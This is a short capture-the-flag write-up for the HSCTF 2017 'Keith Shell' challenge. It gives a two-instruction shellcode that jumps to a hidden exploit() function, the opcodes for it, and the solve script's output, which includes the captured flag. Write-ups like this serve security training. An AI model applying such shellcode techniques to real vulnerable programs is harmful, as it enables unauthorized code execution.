# HSCTF_2017: Keith Shell

**Description:**

>Help [Keith](shell.cpp) write a shellcode to [get a flag](shell)! Netcat to 104.131.90.29:8003 

## Write-up
We just need to craft some shellcode to jump to `exploit()` of address `0x80489fb`. So something like this will be sufficient

    push 0x80489fb
    ret

Translated to opcodes, we get
    
    \x68 \xfb\x89\x04\x08
    \xc3

We now have a [solution](solve.py).

    $ ./solve.py 
    [+] Opening connection to 104.131.90.29 on port 8003: Done
    Flag: 9qCzj0cNsRuwyT6HLIz8RAuBp3NMQ1Bdwm2F2CtquuXea5X0lOWKQ4FeU5fJ

    [*] Closed connection to 104.131.90.29 port 8003

Therefore, the flag is `9qCzj0cNsRuwyT6HLIz8RAuBp3NMQ1Bdwm2F2CtquuXea5X0lOWKQ4FeU5fJ`.
